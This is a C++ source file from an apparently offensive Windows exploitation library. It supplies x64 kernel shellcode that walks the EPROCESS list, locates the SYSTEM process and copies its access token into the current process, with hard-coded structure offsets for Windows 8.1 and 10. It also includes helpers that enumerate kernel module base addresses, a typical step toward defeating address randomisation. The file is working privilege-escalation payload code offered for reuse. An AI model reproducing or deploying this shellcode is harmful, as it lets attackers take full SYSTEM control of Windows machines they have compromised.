#include "kernel.h"

#include "asm.h"
#include "log.h"
#include "nt.h"

#pragma comment(lib, "ntdll.lib")

using namespace pwn::log;


#ifndef __KERNEL_CONSTANTS__
#ifdef __WIN10__
#define KIINITIAL_THREAD  0x0188
#define EPROCESS_OFFSET   0x00b8
#define PROCESSID_OFFSET  0x02e0
#define FLINK_OFFSET      0x02e8
#define TOKEN_OFFSET      0x0358
#define SYSTEM_PID        4

#elif defined(__WIN81__)
#define KIINITIAL_THREAD  0x0188
#define EPROCESS_OFFSET   0x00b8
#define PROCESSID_OFFSET  0x02e0
#define FLINK_OFFSET      0x02e8
#define TOKEN_OFFSET      0x0348
#define SYSTEM_PID        0x4

#endif
#define __KERNEL_CONSTANTS__
#endif


namespace pwn::kernel
{
	namespace shellcode
	{
		namespace
		{
			std::vector<BYTE> __steal_system_token_x64(void)
			{
				const char* sc = ""
					"push rax ;"
					"push rbx ;"
					"push rcx ;"
					"mov rax, gs:[" STR(KIINITIAL_THREAD) "] ;"
					"mov rax, [rax+" STR(EPROCESS_OFFSET) "] ;"
					"mov rbx, rax ;"
					"mov rbx, [rbx+" STR(FLINK_OFFSET) "] ;"
					"__loop: "
					"sub rbx, " STR(FLINK_OFFSET) " ;"
					"mov rcx, [rbx+" STR(PROCESSID_OFFSET) "] ;"
					"cmp rcx, " STR(SYSTEM_PID) " ;"
					"jnz __loop ;"
					"mov rcx, [rbx + " STR(TOKEN_OFFSET) "] ;"
					"and cl, 0xf0 ;"
					"mov [rax + " STR(TOKEN_OFFSET) "], rcx ;"
					"pop rcx ;"
					"pop rbx ;"
					"pop rax ;"
					"add rsp, 0x28 ;"
					"xor rax, rax ;"
					"ret ;";
				const size_t sclen = ::strlen(sc);
				std::vector<BYTE> out;
				if ( !pwn::assm::x64(sc, sclen, out) )
					err(L"failed to compile shellcode\n");
				return out;
			}
		}


		std::vector<BYTE> steal_system_token(void)
		{
#ifdef __x86_64__
			return __steal_system_token_x64();
#endif
		}


		std::vector<BYTE> debug_break(void)
		{
			return std::vector<BYTE>({ 0x90, 0x90, 0xcc, 0xcc });
		}
	}
		


	/*++
	Description:
		Get an iterable of tuple enumerating all the kernel modules, with their base address
	
	Arguments:
		None
	
	Return:
		Returns a vector of <wstring,ulong_ptr> of all the modules
	--*/
	std::vector< std::tuple<std::wstring, ULONG_PTR> > modules()
	{
		std::vector< std::tuple<std::wstring, ULONG_PTR> > mods;
	
		do
		{
			NTSTATUS Status;
			ULONG BufferLength = sizeof(RTL_PROCESS_MODULES);
			std::unique_ptr<BYTE[]> Buffer;
	
			do
			{
				Buffer = std::make_unique<BYTE[]>(BufferLength);
				Status = ::NtQuerySystemInformation(
					SystemModuleInformation,
					Buffer.get(),
					BufferLength,
					&BufferLength
				);
	
				if ( !NT_SUCCESS(Status) )
				{
					if ( Status == STATUS_INFO_LENGTH_MISMATCH )
						continue;
	
					perror(L"NtQuerySystemInformation()\n");
					break;
				}
	
				break;
			}
			while ( TRUE );
	
			if ( !NT_SUCCESS(Status) )
				break;
	
			auto Modules = (PRTL_PROCESS_MODULES)Buffer.get();
			dbg(L"Found %lu modules\n", Modules->NumberOfModules);
	
			for ( DWORD i = 0; i < Modules->NumberOfModules; i++ )
			{
				auto ModuleFullPathName = pwn::utils::to_widestring((const char*)Modules->Modules[i].FullPathName);
				std::tuple<std::wstring, ULONG_PTR> entry = std::make_tuple(ModuleFullPathName, (ULONG_PTR)Modules->Modules[i].ImageBase);
				mods.push_back(entry);
			}
		}
		while ( FALSE );
	
		return mods;
	}


	/*++
	Description:
		Get the kernel module argument passed in argument base address.

	Arguments:
		- lpwszModuleName is a wide string for the name of the module to look up

	Return:
		Returns -1 on error, the address of the module on success
	--*/
	ULONG_PTR get_module_base_address(_In_ const wchar_t* lpwszModuleName)
	{
		ULONG_PTR uKernelBase = (ULONG_PTR)-1;
		std::wstring pattern(lpwszModuleName);

		for ( auto& mod : modules() )
		{
			auto name = std::get<0>(mod);
			auto addr = std::get<1>(mod);


			if ( pwn::utils::endswith(name, pattern) )
			{
				uKernelBase = addr;
				dbg(L"Found %s base (%p)\n", pattern.c_str(), uKernelBase);
				break;
			}
		}
		return uKernelBase;
	}


	ULONG_PTR get_module_base_address(_In_ const std::wstring& ModuleName)
	{
		return get_module_base_address(ModuleName.c_str());
	}
	
}